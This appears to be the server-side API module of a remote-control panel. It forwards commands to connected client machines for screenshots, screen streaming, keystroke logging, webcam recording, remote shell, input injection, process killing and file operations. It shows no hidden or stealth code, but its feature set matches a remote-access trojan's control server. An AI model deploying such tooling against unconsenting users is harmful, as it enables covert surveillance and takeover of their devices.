# -*- coding: utf-8 -*-
"""远程控制代理 API：将 Web 面板的远程操作请求转发到对应客户端。

包含 REST API（同步转发）和 WebSocket 路由（实时流）。
"""
import asyncio
import concurrent.futures
import json
import base64
import logging
import threading

from flask import jsonify, request
from common.protocol import MsgType, make_msg
from server.auth import require_ws_auth

logger = logging.getLogger(__name__)

# 全局终端 WebSocket 管理：client_id → ws 连接
_terminal_ws_map = {}
_terminal_ws_lock = threading.Lock()

# 全局按键记录 WebSocket 管理：client_id → ws 连接
_keylog_ws_map = {}
_keylog_ws_lock = threading.Lock()


def _get_terminal_ws(client_id):
    """获取指定客户端的终端 WebSocket 连接。"""
    with _terminal_ws_lock:
        return _terminal_ws_map.get(client_id)


def _register_terminal_ws(client_id, ws):
    """注册终端 WebSocket 连接。"""
    with _terminal_ws_lock:
        _terminal_ws_map[client_id] = ws


def _unregister_terminal_ws(client_id):
    """移除终端 WebSocket 连接。"""
    with _terminal_ws_lock:
        _terminal_ws_map.pop(client_id, None)


def _get_keylog_ws(client_id):
    """获取指定客户端的按键记录 WebSocket 连接。"""
    with _keylog_ws_lock:
        return _keylog_ws_map.get(client_id)


def _register_keylog_ws(client_id, ws):
    """注册按键记录 WebSocket 连接。"""
    with _keylog_ws_lock:
        _keylog_ws_map[client_id] = ws


def _unregister_keylog_ws(client_id):
    """移除按键记录 WebSocket 连接。"""
    with _keylog_ws_lock:
        _keylog_ws_map.pop(client_id, None)


def register_remote_routes(app, sock, cm):
    """注册远程控制相关的 REST 和 WebSocket 路由。

    Args:
        app: Flask 应用实例
        sock: Sock 实例
        cm: ClientManager 实例
    """

    # 摄像头 WebSocket 管理
    _camera_ws_map = {}
    _camera_ws_lock = threading.Lock()

    # 屏幕流 WebSocket 管理
    _screen_ws_map = {}
    _screen_ws_lock = threading.Lock()

    # 文件传输 WebSocket 管理
    _file_transfer_ws_map = {}
    _file_transfer_ws_lock = threading.Lock()

    def _get_camera_ws(client_id):
        """获取指定客户端的摄像头 WebSocket 连接。"""
        with _camera_ws_lock:
            return _camera_ws_map.get(client_id)

    def _register_camera_ws(client_id, ws):
        """注册摄像头 WebSocket 连接。"""
        with _camera_ws_lock:
            _camera_ws_map[client_id] = ws

    def _unregister_camera_ws(client_id):
        """移除摄像头 WebSocket 连接。"""
        with _camera_ws_lock:
            _camera_ws_map.pop(client_id, None)

    def _get_screen_ws(client_id):
        """获取指定客户端的屏幕流 WebSocket 连接。"""
        with _screen_ws_lock:
            return _screen_ws_map.get(client_id)

    def _register_screen_ws(client_id, ws):
        """注册屏幕流 WebSocket 连接。"""
        with _screen_ws_lock:
            _screen_ws_map[client_id] = ws

    def _unregister_screen_ws(client_id):
        """移除屏幕流 WebSocket 连接。"""
        with _screen_ws_lock:
            _screen_ws_map.pop(client_id, None)

    def _get_file_transfer_ws(client_id):
        """获取指定客户端的文件传输 WebSocket 连接。"""
        with _file_transfer_ws_lock:
            return _file_transfer_ws_map.get(client_id)

    def _register_file_transfer_ws(client_id, ws):
        """注册文件传输 WebSocket 连接。"""
        with _file_transfer_ws_lock:
            _file_transfer_ws_map[client_id] = ws

    def _unregister_file_transfer_ws(client_id):
        """移除文件传输 WebSocket 连接。"""
        with _file_transfer_ws_lock:
            _file_transfer_ws_map.pop(client_id, None)

    # 注册全局事件回调——转发终端数据和按键记录数据
    def _on_data_event(event_type, client_id, data):
        """全局事件回调：转发终端/按键记录数据到对应 WebSocket。"""
        logger.info(f"[事件回调] event_type={event_type}, client_id={client_id}, data_len={len(data.get('data','') if isinstance(data,dict) else str(data))}")
        if event_type == 'terminal_data':
            ws = _get_terminal_ws(client_id)
            logger.info(f"[终端转发] client_id={client_id}, ws={ws is not None}")
            if ws:
                try:
                    text = data.get('data', '') if isinstance(data, dict) else str(data)
                    ws.send(text)
                    logger.info(f"[终端发送成功] len={len(text)}")
                except Exception as e:
                    logger.error(f"终端 WebSocket 发送失败: {e}")
                    _unregister_terminal_ws(client_id)
            else:
                logger.warning(f"[终端无连接] client_id={client_id} 没有注册的 WebSocket")
        elif event_type == 'keylog_data':
            ws = _get_keylog_ws(client_id)
            if ws:
                try:
                    ws.send(json.dumps(data, ensure_ascii=False))
                except Exception as e:
                    logger.error(f"按键记录 WebSocket 发送失败: {e}")
                    _unregister_keylog_ws(client_id)
        elif event_type == 'camera_data':
            ws = _get_camera_ws(client_id)
            if ws:
                try:
                    ws.send(json.dumps(data, ensure_ascii=False))
                except Exception as e:
                    logger.error(f"摄像头 WebSocket 发送失败: {e}")
                    _unregister_camera_ws(client_id)
        elif event_type == 'screen_data':
            ws = _get_screen_ws(client_id)
            if ws:
                try:
                    ws.send(json.dumps(data, ensure_ascii=False))
                except Exception as e:
                    logger.error(f"屏幕流 WebSocket 发送失败: {e}")
                    _unregister_screen_ws(client_id)
        elif event_type == 'file_transfer_data':
            ws = _get_file_transfer_ws(client_id)
            if ws:
                try:
                    ws.send(json.dumps(data, ensure_ascii=False))
                except Exception as e:
                    logger.error(f"文件传输 WebSocket 发送失败: {e}")
                    _unregister_file_transfer_ws(client_id)

    cm.on_event(_on_data_event)
    logger.info("已注册全局事件回调 _on_data_event")

    # ==================== 同步转发辅助 ====================

    def _sync_forward(client_id, msg_type, payload, timeout=30):
        """同步转发指令到客户端并等待响应。

        因为 Flask 是同步的，而 WebSocket 通信是异步的，
        需要通过 asyncio.run_coroutine_threadsafe 桥接。

        Args:
            client_id: 目标客户端 ID
            msg_type: 消息类型（MsgType 枚举）
            payload: 消息负载字典
            timeout: 等待超时秒数

        Returns:
            (response_dict, http_status) 元组
        """
        device = cm.get_device(client_id)
        if not device:
            return {'error': '设备不存在'}, 404
        if not device.online:
            return {'error': '设备离线'}, 503

        # 获取 asyncio 事件循环
        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            return {'error': 'WebSocket 事件循环不可用'}, 500

        msg = make_msg(msg_type, client_id, payload)
        future = asyncio.run_coroutine_threadsafe(
            cm.forward_command(client_id, msg), loop
        )
        try:
            response = future.result(timeout=timeout)
            # 检查是否为错误响应
            resp_type = response.get('type', '')
            if resp_type == MsgType.ERROR.value:
                payload = response.get('payload', {})
                error_code = payload.get('code', '')
                if error_code == 'CLIENT_OFFLINE':
                    return {'error': payload.get('error', '客户端不在线')}, 503
                elif error_code == 'TIMEOUT':
                    return {'error': payload.get('error', '响应超时')}, 504
                else:
                    return {'error': payload.get('error', '未知错误')}, 500
            return response, 200
        except concurrent.futures.TimeoutError:
            return {'error': '指令超时'}, 504
        except Exception as e:
            logger.error(f"转发指令异常: {e}")
            return {'error': str(e)}, 500

    # ==================== REST API ====================

    @app.route('/api/devices/<client_id>/screenshot', methods=['POST'])
    def api_screenshot(client_id):
        """请求客户端截图，返回 base64 编码的图片数据。"""
        response, status = _sync_forward(client_id, MsgType.SCREENSHOT, {})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/screenshot/image')
    def api_screenshot_image(client_id):
        """请求客户端截图，返回 image/jpeg 二进制流。"""
        response, status = _sync_forward(client_id, MsgType.SCREENSHOT, {})
        if status != 200:
            return jsonify(response), status
        payload = response.get('payload', {})
        data_b64 = payload.get('data_b64', '')
        if not data_b64:
            return jsonify({'error': '截图数据为空'}), 500
        try:
            img_bytes = base64.b64decode(data_b64)
        except Exception:
            return jsonify({'error': '截图数据解码失败'}), 500
        return img_bytes, 200, {'Content-Type': 'image/jpeg'}

    @app.route('/api/devices/<client_id>/processes')
    def api_processes(client_id):
        """获取客户端进程列表。

        查询参数：
            sort: 排序字段（cpu / memory），默认 cpu
            limit: 返回数量上限，默认 100
        """
        sort = request.args.get('sort', 'cpu')
        limit = request.args.get('limit', '100')
        payload = {'action': 'list', 'sort': sort, 'limit': int(limit)}
        response, status = _sync_forward(client_id, MsgType.PROCESS, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/processes/<int:pid>/kill', methods=['POST'])
    def api_process_kill(client_id, pid):
        """终止客户端指定进程。"""
        payload = {'action': 'kill', 'pid': pid}
        response, status = _sync_forward(client_id, MsgType.PROCESS, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/mouse', methods=['POST'])
    def api_mouse(client_id):
        """发送鼠标操作指令到客户端。

        请求体：包含 x, y, action 等鼠标操作参数
        """
        data = request.get_json(silent=True) or {}
        response, status = _sync_forward(client_id, MsgType.MOUSE, data)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/keyboard', methods=['POST'])
    def api_keyboard(client_id):
        """发送键盘操作指令到客户端。

        请求体：包含 key, action 等键盘操作参数
        """
        data = request.get_json(silent=True) or {}
        response, status = _sync_forward(client_id, MsgType.KEYBOARD, data)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/terminal/cwd')
    def api_terminal_cwd(client_id):
        """获取客户端终端当前工作目录。"""
        payload = {'action': 'cwd'}
        response, status = _sync_forward(client_id, MsgType.TERMINAL, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/system-info')
    def api_system_info(client_id):
        """获取客户端系统信息（CPU、内存使用率）。"""
        payload = {'action': 'get'}
        response, status = _sync_forward(client_id, MsgType.SYSTEM_INFO, payload, timeout=5)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/camera/list')
    def api_camera_list(client_id):
        """获取摄像头列表。"""
        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'list'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/camera/capture', methods=['POST'])
    def api_camera_capture(client_id):
        """摄像头截图。"""
        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'capture'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/camera/record/start', methods=['POST'])
    def api_camera_record_start(client_id):
        """开始录制。"""
        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'record_start'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/camera/record/stop', methods=['POST'])
    def api_camera_record_stop(client_id):
        """停止录制。"""
        response, status = _sync_forward(client_id, MsgType.CAMERA, {'action': 'record_stop'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/disk')
    def api_disk(client_id):
        """获取磁盘分区列表。"""
        response, status = _sync_forward(client_id, MsgType.DISK, {'action': 'list'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/disk/io')
    def api_disk_io(client_id):
        """获取磁盘IO统计。"""
        response, status = _sync_forward(client_id, MsgType.DISK, {'action': 'io_stats'}, timeout=15)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files')
    def api_files_list(client_id):
        """获取文件列表。"""
        path = request.args.get('path', '')
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'list', 'path': path})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/roots')
    def api_files_roots(client_id):
        """获取根目录列表。"""
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'roots'})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/search', methods=['POST'])
    def api_files_search(client_id):
        """搜索文件。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'search', 'path': data.get('path', ''), 'keyword': data.get('keyword', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload, timeout=30)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/rename', methods=['POST'])
    def api_files_rename(client_id):
        """重命名文件/目录。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'rename', 'path': data.get('path', ''), 'new_name': data.get('new_name', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/delete', methods=['POST'])
    def api_files_delete(client_id):
        """删除文件/目录。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'delete', 'path': data.get('path', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/move', methods=['POST'])
    def api_files_move(client_id):
        """移动文件/目录。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'move', 'source': data.get('source', ''), 'destination': data.get('destination', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/copy', methods=['POST'])
    def api_files_copy(client_id):
        """复制文件/目录。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'copy', 'source': data.get('source', ''), 'destination': data.get('destination', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/mkdir', methods=['POST'])
    def api_files_mkdir(client_id):
        """创建目录。"""
        data = request.get_json(silent=True) or {}
        payload = {'action': 'mkdir', 'path': data.get('path', '')}
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, payload)
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    @app.route('/api/devices/<client_id>/files/info')
    def api_files_info(client_id):
        """获取文件详细信息。"""
        path = request.args.get('path', '')
        response, status = _sync_forward(client_id, MsgType.FILE_MANAGER, {'action': 'info', 'path': path})
        if status != 200:
            return jsonify(response), status
        return jsonify(response.get('payload', {}))

    # ==================== WebSocket 路由（实时流）====================

    @sock.route('/api/devices/<client_id>/terminal/ws')
    def terminal_proxy_ws(ws, client_id):
        """终端 WebSocket 代理：Web→服务端→客户端 的双向终端通道。

        Web 端发送的输入转发到客户端的 TERMINAL handler，
        客户端的 TERMINAL_DATA 输出转发回 Web 端。
        """
        if not require_ws_auth(ws):
            return

        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return

        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            ws.close()
            return

        # 注册此 WebSocket 到全局映射
        _register_terminal_ws(client_id, ws)
        logger.info(f"[终端WS] 已注册 WebSocket: client_id={client_id}")

        try:
            # 先发送终端启动指令（不需要等待响应）
            start_msg = make_msg(MsgType.TERMINAL, client_id, {'action': 'start'})
            logger.info(f"[终端WS] 发送 start 消息: client_id={client_id}, loop={loop is not None}")
            if loop is None:
                logger.error("[终端WS] loop 为 None，无法发送消息!")
            else:
                future = asyncio.run_coroutine_threadsafe(
                    cm.send_to_client(client_id, start_msg), loop
                )
                # 等待发送完成
                try:
                    future.result(timeout=5)
                    logger.info("[终端WS] start 消息已发送")
                except Exception as e:
                    logger.error(f"[终端WS] start 消息发送失败: {e}")

            # 使用阻塞方式接收数据
            import time
            while True:
                try:
                    data = ws.receive(timeout=None)  # 无限等待
                    if data is None:
                        logger.info(f"[终端WS] WebSocket receive 返回 None: client_id={client_id}")
                        break
                    logger.info(f"[终端WS] 收到输入: client_id={client_id}, data_len={len(data)}")
                    # 转发输入到客户端
                    msg = make_msg(MsgType.TERMINAL, client_id, {
                        'action': 'write',
                        'data': data,
                    })
                    asyncio.run_coroutine_threadsafe(
                        cm.send_to_client(client_id, msg), loop
                    )
                except Exception as e:
                    logger.error(f"[终端WS] receive 异常: {e}")
                    break
        finally:
            # 移除 WebSocket 注册
            _unregister_terminal_ws(client_id)
            # 发送终端关闭指令
            try:
                close_msg = make_msg(MsgType.TERMINAL, client_id, {'action': 'close'})
                asyncio.run_coroutine_threadsafe(
                    cm.send_to_client(client_id, close_msg), loop
                )
            except Exception:
                pass

    @sock.route('/api/devices/<client_id>/keylog/ws')
    def keylog_proxy_ws(ws, client_id):
        """按键记录 WebSocket 代理：客户端的 KEYLOG_DATA 事件转发到 Web 端。"""
        if not require_ws_auth(ws):
            return

        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return

        # 注册此 WebSocket 到全局映射
        _register_keylog_ws(client_id, ws)

        # 发送键盘记录启动指令
        loop = getattr(cm, '_ws_loop', None)
        if loop is not None:
            try:
                start_msg = make_msg(MsgType.KEYLOG, client_id, {'action': 'start'})
                asyncio.run_coroutine_threadsafe(
                    cm.send_to_client(client_id, start_msg), loop
                )
            except Exception:
                pass

        try:
            while True:
                data = ws.receive()
                if data is None:
                    break
        finally:
            # 移除 WebSocket 注册
            _unregister_keylog_ws(client_id)
            # 发送键盘记录停止指令
            if loop is not None:
                try:
                    stop_msg = make_msg(MsgType.KEYLOG, client_id, {'action': 'stop'})
                    asyncio.run_coroutine_threadsafe(
                        cm.send_to_client(client_id, stop_msg), loop
                    )
                except Exception:
                    pass

    @sock.route('/api/devices/<client_id>/camera/ws')
    def camera_proxy_ws(ws, client_id):
        """摄像头帧实时流代理。"""
        if not require_ws_auth(ws):
            return
        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return
        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            ws.close()
            return

        _register_camera_ws(client_id, ws)

        # 发送摄像头打开指令
        try:
            open_msg = make_msg(MsgType.CAMERA, client_id, {'action': 'open', 'index': 0})
            asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, open_msg), loop)
        except Exception:
            pass

        try:
            while True:
                data = ws.receive(timeout=None)
                if data is None:
                    break
                # 转发摄像头控制指令到客户端
                try:
                    cmd = json.loads(data) if isinstance(data, str) else data
                    msg = make_msg(MsgType.CAMERA, client_id, cmd)
                    asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
                except Exception:
                    pass
        finally:
            _unregister_camera_ws(client_id)
            # 发送摄像头关闭指令
            try:
                close_msg = make_msg(MsgType.CAMERA, client_id, {'action': 'close'})
                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, close_msg), loop)
            except Exception:
                pass

    @sock.route('/api/devices/<client_id>/screen/ws')
    def screen_proxy_ws(ws, client_id):
        """屏幕帧实时流代理（只接收帧数据，不处理控制）。"""
        if not require_ws_auth(ws):
            return
        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return
        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            ws.close()
            return

        _register_screen_ws(client_id, ws)

        # 发送屏幕流启动指令
        try:
            start_msg = make_msg(MsgType.SCREENSHOT, client_id, {'action': 'start', 'fps': 5, 'quality': 75})
            asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, start_msg), loop)
        except Exception:
            pass

        try:
            while True:
                data = ws.receive(timeout=None)
                if data is None:
                    break
                # 只处理屏幕流控制指令（config）
                try:
                    cmd = json.loads(data) if isinstance(data, str) else data
                    if cmd.get('action') in ('config', 'stop'):
                        msg = make_msg(MsgType.SCREENSHOT, client_id, cmd)
                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
                except Exception:
                    pass
        finally:
            _unregister_screen_ws(client_id)
            # 发送屏幕流停止指令
            try:
                stop_msg = make_msg(MsgType.SCREENSHOT, client_id, {'action': 'stop'})
                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, stop_msg), loop)
            except Exception:
                pass

    @sock.route('/api/devices/<client_id>/control/ws')
    def control_proxy_ws(ws, client_id):
        """独立控制 WebSocket：处理鼠标和键盘操作。"""
        if not require_ws_auth(ws):
            return
        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return
        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            ws.close()
            return

        try:
            while True:
                data = ws.receive(timeout=None)
                if data is None:
                    break
                try:
                    cmd = json.loads(data) if isinstance(data, str) else data
                    msg_type = cmd.get('type', '')

                    if msg_type == 'mouse':
                        # 鼠标控制
                        action = cmd.get('action', '')
                        x = cmd.get('x', 0)
                        y = cmd.get('y', 0)
                        button = cmd.get('button', 0)
                        msg = make_msg(MsgType.MOUSE, client_id, {'action': action, 'x': x, 'y': y, 'button': button})
                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)

                    elif msg_type == 'keyboard':
                        # 键盘控制
                        action = cmd.get('action', 'hotkey')
                        if action == 'combo':
                            combo = cmd.get('combo', '')
                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': 'combo', 'combo': combo})
                        elif action == 'press':
                            key = cmd.get('key', '')
                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': 'press', 'key': key})
                        else:
                            keys = cmd.get('keys', [])
                            msg = make_msg(MsgType.KEYBOARD, client_id, {'action': action, 'keys': keys})
                        asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
                except Exception:
                    pass
        finally:
            pass

    @sock.route('/api/devices/<client_id>/file-transfer/ws')
    def file_transfer_proxy_ws(ws, client_id):
        """文件传输双向代理。"""
        if not require_ws_auth(ws):
            return
        device = cm.get_device(client_id)
        if not device or not device.online:
            ws.close()
            return
        loop = getattr(cm, '_ws_loop', None)
        if loop is None:
            ws.close()
            return

        _register_file_transfer_ws(client_id, ws)

        try:
            while True:
                data = ws.receive(timeout=None)
                if data is None:
                    break
                # 转发文件传输指令到客户端
                try:
                    cmd = json.loads(data) if isinstance(data, str) else data
                    msg_type = MsgType.FILE_TRANSFER_DATA if cmd.get('type') == 'data' else MsgType.FILE_TRANSFER
                    msg = make_msg(msg_type, client_id, cmd)
                    asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, msg), loop)
                except Exception:
                    pass
        finally:
            _unregister_file_transfer_ws(client_id)
            # 取消活动传输
            try:
                cancel_msg = make_msg(MsgType.FILE_TRANSFER, client_id, {'action': 'cancel'})
                asyncio.run_coroutine_threadsafe(cm.send_to_client(client_id, cancel_msg), loop)
            except Exception:
                pass
